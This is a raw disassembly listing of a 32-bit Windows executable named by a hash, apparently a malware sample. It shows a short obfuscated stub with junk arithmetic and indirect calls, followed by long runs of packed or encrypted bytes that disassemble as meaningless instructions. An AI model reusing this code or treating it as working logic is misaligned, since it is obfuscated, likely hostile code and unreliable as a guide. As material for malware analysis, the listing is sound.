
29325916510346fe23bfe40296927c2fdbb4374e70c452783bb9e925a75dd016.exe:     file format pei-i386


Disassembly of section .text:

00401000 <.text>:
  401000:	push   ebp
  401001:	mov    ebp,esp
  401003:	sub    esp,0x70
  401006:	add    DWORD PTR ds:0x428267,edx
  40100c:	mov    eax,DWORD PTR [ebp-0x50]
  40100f:	cmp    DWORD PTR ds:0x42830f,0x0
  401016:	mov    DWORD PTR ds:0x4282df,0x2f64
  401020:	not    ecx
  401022:	jmp    0x401482
  401027:	mov    DWORD PTR ds:0x42822f,0x2f16
  401031:	not    ecx
  401033:	cmp    DWORD PTR ds:0x42830f,0x0
  40103a:	jne    0x401066
  401040:	push   0x2daf
  401045:	call   DWORD PTR ds:0x428d64
  40104b:	mov    ecx,DWORD PTR ds:0x428397
  401051:	sub    DWORD PTR ds:0x42824b,ecx
  401057:	movzx  ecx,WORD PTR ds:0x428277
  40105e:	and    DWORD PTR ds:0x428233,ecx
  401064:	add    ecx,ecx
  401066:	mov    ecx,DWORD PTR ds:0x4281bf
  40106c:	xor    edx,edx
  40106e:	add    edx,DWORD PTR ds:0x4282b7
  401074:	sub    ecx,edx
  401076:	xor    ecx,DWORD PTR [ecx+edx*1]
  401079:	adc    DWORD PTR ds:0x42836f,0x71ea
  401083:	mov    ecx,DWORD PTR ds:0x42829b
  401089:	mov    edx,DWORD PTR ds:0x42839b
  40108f:	sub    edx,ecx
  401091:	xor    ecx,DWORD PTR [ecx+edx*1]
  401094:	adc    DWORD PTR ds:0x4282ff,ebx
  40109a:	and    DWORD PTR ds:0x428247,0x4c59
  4010a4:	jmp    0x401482
  4010a9:	jae    0x4010a7
  4010ab:	ins    DWORD PTR es:[edi],dx
  4010ac:	mov    cl,0x5b
  4010ae:	and    DWORD PTR [ebx],esi
  4010b0:	cmp    ebp,DWORD PTR [edx+0x10befcb3]
  4010b6:	push   edx
  4010b7:	test   eax,0x181818bc
  4010bc:	sbb    BYTE PTR [esi-0x5fe7e7ee],bl
  4010c2:	hlt    
  4010c3:	dec    esi
  4010c4:	loope  0x401086
  4010c6:	mov    ?,eax
  4010c8:	mov    cl,0xf9
  4010ca:	clc    
  4010cb:	out    0x2e,al
  4010cd:	or     dl,bh
  4010cf:	jo     0x401082
  4010d1:	adc    BYTE PTR [edi],dl
  4010d3:	stc    
  4010d4:	pop    ss
  4010d5:	jno    0x401135
  4010d7:	sbb    eax,0x648fe8fa
  4010dc:	(bad)  
  4010de:	mov    esp,0xa611f941
  4010e3:	and    eax,0x732a514e
  4010e8:	inc    edx
  4010e9:	mov    ds:0x95d8e3bf,eax
  4010ee:	cld    
  4010ef:	clc    
  4010f0:	sub    eax,0xcd39b412
  4010f5:	dec    eax
  4010f6:	pop    esi
  4010f7:	push   edx
  4010f8:	and    al,0x9
  4010fa:	fcomp  QWORD PTR [ebx-0x3e921a10]
  401100:	dec    esi
  401101:	inc    edx
  401102:	xchg   esp,eax
  401103:	retf   0x94f8
  401106:	xor    BYTE PTR [ebx],0x95
  401109:	jle    0x40110b
  40110b:	sti    
  40110c:	xchg   esi,eax
  40110d:	mov    DWORD PTR [ebx],ecx
  40110f:	arpl   WORD PTR fs:[ebp+esi*4-0x6c5f57e5],sp
  401117:	jmp    0x4010a3
  401119:	adc    DWORD PTR ds:0xde1e2cda,edi
  40111f:	lea    ebp,[edi+0x13]
  401122:	gs and al,0xa3
  401125:	(bad)  
  401126:	dec    esi
  401127:	sti    
  401128:	das    
  401129:	adc    BYTE PTR [edx],dl
  40112b:	jo     0x401129
  40112d:	adc    ecx,ebx
  40112f:	inc    esp
  401130:	add    BYTE PTR [eax-0x3c],dl
  401133:	add    al,0x57
  401135:	xchg   BYTE PTR [eax-0x25],ch
  401138:	mov    al,ds:0xfcb15031
  40113d:	(bad)  
  40113e:	mov    ds:0x9076f90d,al
  401143:	and    DWORD PTR [ebx+0x50df6eed],edx
  401149:	push   es
  40114a:	and    BYTE PTR [ebx],al
  40114c:	ja     0x401177
  40114e:	pop    eax
  40114f:	scas   al,BYTE PTR es:[edi]
  401150:	lods   al,BYTE PTR ds:[esi]
  401151:	mov    BYTE PTR [eax+edi*1],0x40
  401155:	and    dh,BYTE PTR [eax]
  401157:	shr    BYTE PTR [ecx+0x41],0xdc
  40115b:	lahf   
  40115c:	addr16 jp 0x4011a9
  40115f:	jle    0x4011c2
  401161:	push   ss
  401162:	pusha  
  401163:	cld    
  401164:	pop    esp
  401165:	or     bl,BYTE PTR [ecx+0x29d40d2f]
  40116b:	xchg   esi,eax
  40116c:	push   ebx
  40116d:	popf   
  40116e:	sbb    ch,BYTE PTR [ebp-0x75d51597]
  401174:	xchg   dh,dl
  401176:	sub    al,0x9
  401178:	add    eax,0x6a7512e2
  40117d:	push   edi
  40117e:	(bad)  
  40117f:	fild   WORD PTR [eax+edi*8+0x52]
  401183:	cmp    eax,0xf32f4dbf
  401188:	(bad)  
  401189:	cmp    eax,DWORD PTR [edi-0x58]
  40118c:	mov    bl,0xcc
  40118e:	adc    DWORD PTR [esi*1-0x331af99f],esp
  401195:	mov    ch,0xd9
  401197:	pop    ebp
  401198:	aad    0x97
  40119a:	inc    ecx
  40119b:	push   ds
  40119c:	(bad)  
  40119d:	outs   dx,DWORD PTR ss:[esi]
  40119f:	fisttp QWORD PTR [eax+0x7a]
  4011a2:	les    esp,FWORD PTR [eax]
  4011a4:	pop    ebx
  4011a5:	out    dx,al
  4011a6:	push   eax
  4011a7:	lea    ebp,[ecx]
  4011a9:	stc    
  4011aa:	mov    eax,ds:0x5cfeae1a
  4011af:	jp     0x40120e
  4011b1:	bnd jne 0x40116c
  4011b4:	push   edi
  4011b5:	cmp    edx,edi
  4011b7:	dec    esp
  4011b8:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4011b9:	test   BYTE PTR [edi-0x48da5570],dh
  4011bf:	sub    ecx,DWORD PTR [eax-0x51f24df8]
  4011c5:	fwait
  4011c6:	into   
  4011c7:	pop    edx
  4011c8:	mov    al,ds:0x9c3679c5
  4011cd:	pop    ebx
  4011ce:	pop    ds
  4011cf:	or     DWORD PTR [ebp+0x6e2fa1e4],ebx
  4011d5:	jmp    0x401191
  4011d7:	push   ss
  4011d8:	xor    al,0x92
  4011da:	xor    edx,DWORD PTR [esi-0x28]
  4011dd:	lock idiv BYTE PTR [ebx+esi*1+0x3f]
  4011e2:	or     eax,0xe95866b6
  4011e7:	and    dh,BYTE PTR [edx+0x79]
  4011ea:	ror    ebp,cl
  4011ec:	loope  0x401263
  4011ee:	push   ebx
  4011ef:	shl    DWORD PTR [ecx-0x41],0x47
  4011f3:	int    0x8f
  4011f5:	loope  0x4011b8
  4011f7:	cwde   
  4011f8:	inc    edi
  4011f9:	adc    DWORD PTR [ebp+0xcbc9543],ebp
  4011ff:	mov    edx,0xde275dc
  401204:	jb     0x8671a1ac
  40120a:	xchg   esp,eax
  40120b:	fistp  DWORD PTR [esi+esi*4+0x727e4950]
  401212:	mov    BYTE PTR [ebx-0x3a9eb71],ah
  401218:	scas   eax,DWORD PTR es:[edi]
  401219:	outs   dx,DWORD PTR ds:[esi]
  40121a:	inc    ebx
  40121b:	mov    ebx,DWORD PTR [ecx]
  40121d:	stos   DWORD PTR es:[edi],eax
  40121e:	pop    ds
  40121f:	sbb    ecx,DWORD PTR [ecx+0x649b6cf0]
  401225:	scas   eax,DWORD PTR es:[edi]
  401226:	adc    eax,0x576ed47f
  40122b:	mov    dh,0x83
  40122d:	test   DWORD PTR [ecx-0x18d87568],eax
  401233:	mov    esi,0x2b7b2262
  401238:	cmp    esi,ebp
  40123a:	dec    ebx
  40123b:	jg     0x401273
  40123d:	test   BYTE PTR [ebp-0x66],bh
  401240:	or     BYTE PTR [ebp-0x665ba2b4],ah
  401246:	mov    bl,0x8d
  401248:	js     0x40128a
  40124a:	sar    DWORD PTR [eax-0x48652dbd],0xb1
  401251:	idiv   BYTE PTR [ecx-0x74c704a2]
  401257:	inc    edx
  401258:	stc    
  401259:	adc    bl,BYTE PTR [edx+eax*2+0x255d4660]
  401260:	or     ecx,DWORD PTR [ebx]
  401262:	fwait
  401263:	pop    ebp
  401264:	sbb    si,bx
  401267:	fstp   DWORD PTR [esi-0x149df763]
  40126d:	add    BYTE PTR ds:[edx-0x5bc64a53],cl
  401274:	mov    esp,0x31b261b6
  401279:	jnp    0x4012a8
  40127b:	sahf   
  40127c:	loopne 0x401272
  40127e:	out    dx,al
  40127f:	adc    al,0x8a
  401281:	dec    ebx
  401282:	cld    
  401283:	sti    
  401284:	mov    WORD PTR [edi-0x78d89158],gs
  40128a:	pop    es
  40128b:	cmp    BYTE PTR [edx+esi*2],cl
  40128e:	xor    bh,BYTE PTR [edi]
  401290:	pop    ebx
  401291:	push   esp
  401292:	jne    0x401279
  401294:	sub    esi,DWORD PTR [ecx-0x6a]
  401297:	(bad)  
  401298:	lock stos DWORD PTR es:[edi],eax
  40129a:	aam    0xb8
  40129c:	adc    al,0xd
  40129e:	sbb    al,0x8
  4012a0:	xor    esi,DWORD PTR [ebp+ecx*4+0x9ba271f]
  4012a7:	xor    eax,0xb56c46b1
  4012ac:	add    DWORD PTR [esi-0x830b175],eax
  4012b2:	and    eax,0x8daf0920
  4012b7:	int3   
  4012b8:	int    0x6b
  4012ba:	xchg   edx,eax
  4012bb:	inc    edi
  4012bc:	fsub   DWORD PTR [esi-0x2e0cf97b]
  4012c2:	les    ecx,FWORD PTR [esi]
  4012c4:	and    edi,esp
  4012c6:	xor    al,0x9f
  4012c8:	sahf   
  4012c9:	cmp    BYTE PTR [esi+0x643fef6a],dl
  4012cf:	jnp    0x401265
  4012d1:	mov    edx,0xce66ba61
  4012d6:	inc    ecx
  4012d7:	mov    DWORD PTR [eax],eax
  4012d9:	je     0x4012bd
  4012db:	fs ret 0xf13d
  4012df:	aas    
  4012e0:	addr16 xchg esi,eax
  4012e2:	ins    DWORD PTR es:[edi],dx
  4012e3:	clc    
  4012e4:	mov    dh,0xb7
  4012e6:	fst    DWORD PTR [ebp-0x5016d433]
  4012ec:	es add ch,al
  4012ef:	add    bl,BYTE PTR [ecx]
  4012f1:	xchg   esp,ebp
  4012f3:	and    ch,BYTE PTR [ebp-0x4]
  4012f6:	mov    esi,0x96f09d64
  4012fb:	mov    WORD PTR [edi-0x458f9e1c],?
  401301:	mov    edx,0x16bd7805
  401306:	add    BYTE PTR [esp+edi*2],dh
  401309:	imul   esp,DWORD PTR [eax],0x16
  40130c:	or     dl,BYTE PTR [ebp-0xc3e47bb]
  401312:	imul   esi,DWORD PTR [edi-0x3834e0f4],0x1b
  401319:	mov    al,bh
  40131b:	sub    al,0x2b
  40131d:	and    BYTE PTR [esi-0x3cdb0ab8],bl
  401323:	cmova  eax,DWORD PTR [ebx]
  401326:	mov    bl,0xb6
  401328:	xor    DWORD PTR ds:[edi],eax
  40132b:	sbb    BYTE PTR [edi+0x64],bl
  40132e:	scas   eax,DWORD PTR es:[edi]
  40132f:	dec    ecx
  401330:	jno    0x40139f
  401332:	xlat   BYTE PTR ds:[ebx]
  401333:	inc    ebx
  401334:	les    edi,FWORD PTR [esi+0x6d]
  401337:	shl    BYTE PTR [ebx+0x6fa7d0da],0xf0
  40133e:	lahf   
  40133f:	dec    esi
  401340:	mov    DWORD PTR [edi-0x5],edi
  401343:	mov    bl,0xc1
  401345:	out    dx,eax
  401346:	add    dh,BYTE PTR [esi+0x2a3dd26c]
  40134c:	xchg   esi,eax
  40134d:	xor    al,0x64
  40134f:	push   ss
  401350:	mov    ebp,0x2e103fc0
  401355:	fistp  QWORD PTR [ebp+0x5e]
  401358:	rol    cl,0xd1
  40135b:	dec    ecx
  40135c:	sbb    BYTE PTR [ecx-0x32],dh
  40135f:	add    al,0xb6
  401361:	daa    
  401362:	dec    edi
  401363:	fisttp DWORD PTR [edi+0x730405f2]
  401369:	push   0x1b
  40136b:	pop    esp
  40136c:	int    0xac
  40136e:	sub    DWORD PTR [ecx+0x4ba1c2d1],ebp
  401374:	data16 (bad) 
  401376:	sbb    eax,0xd78c084f
  40137b:	pop    eax
  40137c:	push   cs
  40137d:	jbe    0x4013b7
  40137f:	sub    esi,DWORD PTR ds:0xb66ffcb1
  401385:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  401386:	cli    
  401387:	jo     0x4013b8
  401389:	sbb    cl,al
  40138b:	xor    BYTE PTR [edi-0x158f001c],0x4d
  401392:	xchg   esp,eax
  401393:	adc    edx,DWORD PTR [esi]
  401395:	dec    ebx
  401396:	fnstenv [ebx+ecx*8+0x371a7f4c]
  40139d:	dec    esi
  40139e:	pop    ebx
  40139f:	xchg   ecx,eax
  4013a0:	fiadd  WORD PTR [ecx+esi*2]
  4013a3:	xor    al,0xe
  4013a5:	cmp    DWORD PTR [esi],ebx
  4013a7:	cmp    esi,DWORD PTR [eax+0x1b]
  4013aa:	add    ebp,ecx
  4013ac:	mov    ebp,esi
  4013ae:	aas    
  4013af:	and    al,0x57
  4013b1:	test   BYTE PTR [ebx-0x1],al
  4013b4:	mov    dl,0x32
  4013b6:	repnz mov eax,DWORD PTR [ebx]
  4013b9:	sub    DWORD PTR es:[edi+0x25],edx
  4013bd:	mov    cl,BYTE PTR [edi-0x523b0b16]
  4013c3:	in     eax,0x50
  4013c5:	jns    0x40140d
  4013c7:	in     eax,dx
  4013c8:	sub    dl,cl
  4013ca:	scas   al,BYTE PTR es:[edi]
  4013cb:	sbb    eax,0x5d36a0cf
  4013d0:	push   edx
  4013d1:	push   edx
  4013d2:	test   BYTE PTR [eax-0x45cf16ad],ch
  4013d8:	call   0xa27b:0xbf01e925
  4013df:	and    ecx,ebx
  4013e1:	and    DWORD PTR [edx],0xffffffb8
  4013e4:	test   BYTE PTR [edx],0xb6
  4013e7:	push   cs
  4013e8:	jmp    0x59d5:0xe12692a2
  4013ef:	and    al,0xcc
  4013f1:	dec    edi
  4013f2:	loop   0x40141c
  4013f4:	aam    0x18
  4013f6:	ficom  WORD PTR [edx-0x1ed64d2e]
  4013fc:	pop    ebp
  4013fd:	pop    es
  4013fe:	ss mov al,0x9e
  401401:	cli    
  401402:	cmp    eax,DWORD PTR [eax+0x6a264734]
  401408:	stc    
  401409:	(bad)  
  40140a:	xor    ah,BYTE PTR [edx+0x2c]
  40140d:	sub    DWORD PTR [eax-0x73],0x3e332439
  401414:	fist   DWORD PTR [eax]
  401416:	jl     0x401451
  401418:	xor    cl,BYTE PTR [ebx-0x23]
  40141b:	jl     0x401418
  40141d:	mov    esp,0xa4eba725
  401422:	dec    edi
  401423:	or     BYTE PTR [esi-0x26],0xa2
  401427:	mov    ch,0xde
  401429:	dec    esp
  40142a:	add    dh,BYTE PTR [ecx]
  40142c:	mov    eax,ds:0xd1f6c70b
  401431:	mov    ebp,0x473605a7
  401436:	imul   eax,DWORD PTR [edx+0x2d],0x63
  40143a:	aam    0x24
  40143c:	pop    es
  40143d:	sbb    DWORD PTR [ecx-0x5d],edx
  401440:	shl    BYTE PTR [ebp-0x35640555],0x24
  401447:	int    0xce
  401449:	or     al,bh
  40144b:	aam    0xb0
  40144d:	call   0xe58aaca5
  401452:	fdecstp 
  401454:	nop
  401455:	and    BYTE PTR [ebx+0x4d94dc32],dh
  40145b:	stos   DWORD PTR es:[edi],eax
  40145c:	jg     0x40148c
  40145e:	jge    0x401425
  401460:	nop
  401461:	popf   
  401462:	jmp    0x40147f
  401464:	mov    WORD PTR [edx],?
  401466:	aam    0x2c
  401468:	neg    BYTE PTR [edx+0x21]
  40146b:	les    esp,FWORD PTR [ebx]
  40146d:	or     al,0xa7
  40146f:	push   ss
  401470:	or     DWORD PTR [esi+0x6d],ecx
  401473:	in     ax,dx
  401475:	xor    DWORD PTR [eax-0x3],ebx
  401478:	lods   al,BYTE PTR ds:[esi]
  401479:	into   
  40147a:	ss jo  0x4013ff
  40147d:	out    0xf2,eax
  40147f:	or     eax,0x4d8b5508
  401484:	mov    ah,0x8b
  401486:	push   ebp
  401487:	mov    al,0x2b
  401489:	ret    0x1589
  40148c:	pop    edi
  40148d:	add    DWORD PTR [edx+0x0],0x57
  401491:	mov    edi,DWORD PTR [ebp-0x4c]
  401494:	mov    DWORD PTR [ebp-0x50],eax
  401497:	mov    edx,0x488c
  40149c:	sbb    ecx,edi
  40149e:	mov    DWORD PTR [ebp-0x4c],ecx
  4014a1:	mov    edx,DWORD PTR ds:0x42829b
  4014a7:	mov    edx,DWORD PTR [edx]
  4014a9:	and    DWORD PTR ds:0x4282eb,edx
  4014af:	or     DWORD PTR [ebp-0x50],0xca78cc41
  4014b6:	or     DWORD PTR [ebp-0x4c],0x9c1b89e8
  4014bd:	and    DWORD PTR ds:0x42821b,0x6649
  4014c7:	mov    eax,DWORD PTR [ebp-0x58]
  4014ca:	add    ecx,0xa44
  4014d0:	mov    ecx,DWORD PTR [ebp-0x54]
  4014d3:	cmp    DWORD PTR ds:0x428243,0x0
  4014da:	mov    DWORD PTR ds:0x42821f,ecx
  4014e0:	mov    DWORD PTR ds:0x4282e3,0x3ae4
  4014ea:	mov    edi,0x1ebc
  4014ef:	mov    edx,0x7e4f
  4014f4:	jmp    0x40154f
  4014f9:	not    DWORD PTR ds:0x42815b
  4014ff:	mov    edx,0x300f
  401504:	cmp    DWORD PTR ds:0x428243,0x0
  40150b:	jae    0x401543
  401511:	push   0x1b93
  401516:	call   DWORD PTR ds:0x428d68
  40151c:	mov    edx,DWORD PTR ds:0x4282bb
  401522:	xor    edi,edi
  401524:	or     edi,DWORD PTR ds:0x428333
  40152a:	sub    edx,edi
  40152c:	or     edx,DWORD PTR [edx+edi*1]
  40152f:	xor    edx,edx
  401531:	add    edx,DWORD PTR ds:0x42818f
  401537:	mov    edi,DWORD PTR ds:0x428337
  40153d:	sub    edi,edx
  40153f:	imul   edx,DWORD PTR [edx+edi*1]
  401543:	and    edi,0x359a
  401549:	or     edi,0x3261
  40154f:	mov    edx,DWORD PTR [ebp-0x58]
  401552:	mov    edi,DWORD PTR [ebp-0x54]
  401555:	jmp    0x401933
  40155a:	outs   dx,DWORD PTR ds:[esi]
  40155b:	add    eax,0x3a5a4a0b
  401560:	das    
  401561:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  401562:	out    dx,al
  401563:	sbb    ebx,DWORD PTR [ebp-0x7e8f7790]
  401569:	mov    al,0x9e
  40156b:	adc    bl,BYTE PTR [eax]
  40156d:	sbb    BYTE PTR [esi+0x1181812],bl
  401573:	jle    0x401524
  401575:	das    
  401576:	mov    cl,0x10
  401578:	fisttp DWORD PTR [ebx+0x514edf6c]
  40157e:	push   es
  40157f:	int    0x72
  401581:	cli    
  401582:	arpl   cx,di
  401584:	push   ss
  401585:	inc    ebp
  401586:	add    bl,ah
  401588:	das    
  401589:	loope  0x4015c3
  40158b:	jbe    0x40151c
  40158d:	iret   
  40158e:	push   ds
  40158f:	pop    DWORD PTR [eax+0x1f]
  401592:	xchg   esp,eax
  401593:	lods   eax,DWORD PTR ds:[esi]
  401594:	dec    edx
  401595:	dec    ebp
  401596:	lods   eax,DWORD PTR ds:[esi]
  401597:	popf   
  401598:	shl    BYTE PTR [ecx+0x1b],0xde
  40159c:	xchg   DWORD PTR [ebp+esi*8-0x5989fc4a],esi
  4015a3:	adc    DWORD PTR [eiz*1-0x619dfabf],esi
  4015aa:	and    ebx,DWORD PTR [edx+0x62]
  4015ad:	dec    eax
  4015ae:	test   DWORD PTR [esi+0x46],0x2426a94f
  4015b5:	jne    0x40153e
  4015b7:	int3   
  4015b8:	push   ebp
  4015b9:	pop    es
  4015ba:	or     esp,ebx
  4015bc:	(bad)  
  4015bd:	cmc    
  4015be:	push   0xb5a56220
  4015c3:	imul   ebx,edx,0xe6c393a2
  4015c9:	add    DWORD PTR [ecx-0x32283ac4],edi
  4015cf:	adc    DWORD PTR [edx-0x58df8be8],ebp
  4015d5:	sahf   
  4015d6:	cmp    al,0x78
  4015d8:	or     esp,DWORD PTR [eax+eax*2+0x5]
  4015dc:	fcomp  DWORD PTR ds:0xa6fd2ec4
  4015e2:	iret   
  4015e3:	in     al,dx
  4015e4:	cmp    dl,BYTE PTR [esi+esi*2-0x3c]
  4015e8:	in     al,dx
  4015e9:	ret    0x28d9
  4015ec:	sbb    ecx,DWORD PTR [edi]
  4015ee:	loopne 0x4015fa
  4015f0:	pop    ss
  4015f1:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4015f2:	inc    eax
  4015f3:	inc    ecx
  4015f4:	test   eax,0x161bd984
  4015f9:	mov    ds:0xf9105ff8,eax
  4015fe:	add    bl,BYTE PTR [ebx-0x41]
  401601:	fwait
  401602:	into   
  401603:	fnstsw WORD PTR [ebx+0x4]
  401606:	mov    ebp,0xbe076feb
  40160b:	push   cs
  40160c:	(bad)  
  40160e:	bound  edx,QWORD PTR [esi+edi*2]
  401611:	outs   dx,BYTE PTR ds:[esi]
  401612:	push   cs
  401613:	cmc    
  401614:	and    dh,BYTE PTR [eax+0x4bd8a250]
  40161a:	mov    edi,0xb11b0425
  40161f:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  401620:	jg     0x401610
  401622:	mov    ds:0xdc842a3c,eax
  401627:	dec    ecx
  401628:	mov    ?,ebx
  40162a:	int3   
  40162b:	and    al,0x48
  40162d:	sbb    eax,0xa74ba04
  401632:	jge    0x401664
  401634:	push   ebp
  401635:	loope  0x40168f
  401637:	jg     0x4016af
  401639:	cmp    esp,edx
  40163b:	sbb    eax,0x1861b2c5
  401640:	bound  edi,QWORD PTR [esp+esi*1-0x18bcc342]
  401647:	inc    esp
  401648:	xchg   BYTE PTR [edi-0x22],cl
  40164b:	lea    ebp,[edx-0x6b]
  40164e:	imul   ebx,DWORD PTR [esi],0xfffffff3
  401651:	mov    dl,0xec
  401653:	mov    eax,0x451c3f63
  401658:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  401659:	gs ins DWORD PTR es:[edi],dx
  40165b:	xchg   ecx,eax
  40165c:	cmp    bh,BYTE PTR [ebx+0x2]
  40165f:	cdq    
  401660:	iret   
  401661:	ret    0x5da1
  401664:	sub    eax,0xe20ba1cc
  401669:	repnz fstp DWORD PTR ds:0x5c38608e
  401670:	or     BYTE PTR [eax],0x90
  401673:	xor    ecx,DWORD PTR [eax+0x19]
  401676:	aaa    
  401677:	push   0xffffffa9
  401679:	dec    ebx
  40167a:	(bad)  
  40167b:	(bad)  
  40167d:	cmp    DWORD PTR [ebx-0x36],ecx
  401680:	push   edi
  401681:	pop    esp
  401682:	adc    al,0xf6
  401684:	jnp    0x401649
  401686:	add    DWORD PTR [esi],0x2c5fc53d
  40168c:	xor    al,0xfa
  40168e:	aad    0xf4
  401690:	imul   edi,DWORD PTR [ebx+0x730b2295],0x86eb1d01
  40169a:	add    edx,esi
  40169c:	ds dec ecx
  40169e:	lds    edi,FWORD PTR [ebp+0x38]
  4016a1:	call   0xcffc:0xa77220db
  4016a8:	and    eax,0xdab3ce03
  4016ad:	leave  
  4016ae:	fadd   DWORD PTR [edx]
  4016b0:	pop    esp
  4016b1:	adc    al,0xba
  4016b3:	jno    0x40163f
  4016b5:	jge    0x4016dd
  4016b7:	mov    al,ds:0xbbf19db9
  4016bc:	arpl   WORD PTR [esi+eiz*4],ax
  4016bf:	or     eax,0x81327712
  4016c4:	arpl   WORD PTR [esi+0x4d],si
  4016c7:	stos   DWORD PTR es:[edi],eax
  4016c8:	retf   
  4016c9:	mov    ch,0xcb
  4016cb:	imul   ecx,DWORD PTR [eax-0x4f8f880d],0x3539c97
  4016d5:	fadd   st(7),st
  4016d7:	cmovb  edx,DWORD PTR [edx]
  4016da:	xor    edx,DWORD PTR [esp+ebx*8-0x74]
  4016de:	pop    es
  4016df:	sub    BYTE PTR [ebp-0x48],ah
  4016e2:	jo     0x401670
  4016e4:	inc    eax
  4016e5:	jl     0x4016a9
  4016e7:	fdivr  st(0),st
  4016e9:	mov    al,0x65
  4016eb:	les    edi,FWORD PTR [edi]
  4016ed:	push   ds
  4016ee:	lahf   
  4016ef:	imul   edx,DWORD PTR [ebx-0x601668ca],0xffffffdd
  4016f6:	(bad)  
  4016f7:	fmul   QWORD PTR [ecx]
  4016f9:	and    cl,BYTE PTR [edi+0x77c4887f]
  4016ff:	aaa    
  401700:	push   ds
  401701:	xor    ah,BYTE PTR [esi+0x5f9b8b28]
  401707:	stos   DWORD PTR es:[edi],eax
  401708:	mov    edi,0x67f8ffdd
  40170d:	push   ss
  40170e:	hlt    
  40170f:	or     edx,0x31372e72
  401715:	pop    ebp
  401716:	adc    edi,DWORD PTR [edi-0x16]
  401719:	mov    ss,WORD PTR ds:0x34abd9e
  40171f:	cs jg  0x4016cb
  401722:	(bad)  
  401723:	in     al,dx
  401724:	jecxz  0x4017a0
  401726:	xor    al,0xfc
  401728:	fldenv [eax]
  40172a:	sar    edx,cl
  40172c:	pop    ds
  40172d:	or     eax,DWORD PTR [esp+esi*2-0x2f]
  401731:	cld    
  401732:	(bad)  [esi]
  401734:	ss into 
  401736:	js     0x401762
  401738:	jbe    0x4017b9
  40173a:	(bad)  
  40173b:	mov    dl,0xdd
  40173d:	xchg   edx,eax
  40173e:	mov    esp,0x2445e5cc
  401743:	xor    ebp,ecx
  401745:	jae    0x4016c8
  401747:	mov    esi,0xf9c8f57b
  40174c:	leave  
  40174d:	scas   eax,DWORD PTR es:[edi]
  40174e:	call   0xd248ac14
  401753:	loopne 0x4016ed
  401755:	mov    cl,0x6a
  401757:	and    eax,0x47d57540
  40175c:	ja     0x401710
  40175e:	call   0xdf86dcfe
  401763:	inc    ecx
  401764:	test   ecx,ebx
  401766:	std    
  401767:	call   0x61ec:0xe5a61999
  40176e:	jo     0x4016f6
  401770:	mov    dl,0x8c
  401772:	int    0x27
  401774:	cld    
  401775:	pop    esp
  401776:	xchg   esp,eax
  401777:	pop    ds
  401778:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  401779:	test   BYTE PTR [ebp-0x61],ah
  40177c:	(bad)  
  40177d:	lahf   
  40177e:	lods   eax,DWORD PTR ds:[esi]
  40177f:	inc    eax
  401780:	inc    edi
  401781:	add    DWORD PTR [eax],edi
  401783:	repnz xlat BYTE PTR ds:[ebx]
  401785:	iret   
  401786:	or     edx,edi
  401788:	adc    dh,BYTE PTR [ebp+ebp*4-0x354cfe32]
  40178f:	cmp    edx,ecx
  401791:	std    
  401792:	push   ss
  401793:	add    eax,0x813a5130
  401798:	dec    edx
  401799:	dec    edx
  40179a:	mov    eax,ds:0x58659310
  40179f:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4017a0:	les    esi,FWORD PTR [ebx+0x71f6866c]
  4017a6:	adc    ch,BYTE PTR [ecx]
  4017a8:	sbb    DWORD PTR [ecx+ebx*8-0x7acb54bb],esi
  4017af:	pop    ss
  4017b0:	std    
  4017b1:	stc    
  4017b2:	gs sbb DWORD PTR ds:[edi+0x3b8e5601],0x9
  4017bb:	enter  0x533f,0x90
  4017bf:	sbb    eax,0xb6dd0c10
  4017c4:	xchg   esp,eax
  4017c5:	les    esi,FWORD PTR [edi+ebp*2]
  4017c8:	int    0xe
  4017ca:	fcmovbe st,st(0)
  4017cc:	fnstcw WORD PTR [edi+edx*2]
  4017cf:	pop    ecx
  4017d0:	pop    ds
  4017d1:	jl     0x40182a
  4017d3:	adc    eax,DWORD PTR [edx]
  4017d5:	add    edi,DWORD PTR [edi+0x71]
  4017d8:	pop    es
  4017d9:	sbb    edi,eax
  4017db:	sub    al,0xec
  4017dd:	icebp  
  4017de:	js     0x4017cb
  4017e0:	test   DWORD PTR [edi],0x9b041811
  4017e6:	mov    bl,0xf0
  4017e8:	xor    ah,bh
  4017ea:	imul   ebx,DWORD PTR [ebx-0x2c],0xef5f2368
  4017f1:	sahf   
  4017f2:	pop    esi
  4017f3:	inc    eax
  4017f4:	jno    0x4017a8
  4017f6:	dec    esp
  4017f7:	mov    cl,0x44
  4017f9:	adc    eax,0x87aea12f
  4017fe:	dec    ecx
  4017ff:	out    dx,eax
  401800:	cdq    
  401801:	cmovnp esp,DWORD PTR [eax-0x7e]
  401805:	aad    0x63
  401807:	fs mov bh,0x3d
  40180a:	sti    
  40180b:	mov    ds:0xc5131b04,al
  401810:	inc    edi
  401811:	mov    dh,0x68
  401813:	xchg   edx,eax
  401814:	sbb    al,ah
  401816:	ins    BYTE PTR es:[edi],dx
  401817:	jae    0x401809
  401819:	les    ebx,FWORD PTR [esi+0x8]
  40181c:	adc    dl,dh
  40181e:	in     al,0xbc
  401820:	popa   
  401821:	mov    ecx,0x1007f291
  401826:	test   BYTE PTR [ebp+0x6a],al
  401829:	outs   dx,DWORD PTR ds:[esi]
  40182a:	xor    bl,BYTE PTR cs:[ebx-0x39229ac6]
  401831:	fidiv  WORD PTR [ebp+0x6d]
  401834:	in     eax,dx
  401835:	rcr    ecx,cl
  401837:	(bad)  
  401838:	lods   al,BYTE PTR ds:[esi]
  401839:	mov    esi,0x79be6585
  40183e:	out    0x78,eax
  401840:	push   cs
  401841:	int3   
  401842:	adc    esi,DWORD PTR [esi+edx*2+0x4c]
  401846:	into   
  401847:	int3   
  401848:	ins    BYTE PTR es:[edi],dx
  401849:	cmc    
  40184a:	fisubr DWORD PTR [edx-0x74]
  40184d:	fwait
  40184e:	sbb    cl,BYTE PTR [edi-0x5a]
  401851:	fisttp WORD PTR [edi+0x1]
  401854:	jnp    0x40180f
  401856:	or     BYTE PTR [edx+edx*2+0x6b],dl
  40185a:	sti    
  40185b:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40185c:	test   al,0xfe
  40185e:	pop    esp
  40185f:	xchg   edx,eax
  401860:	jne    0x401881
  401862:	xchg   esi,eax
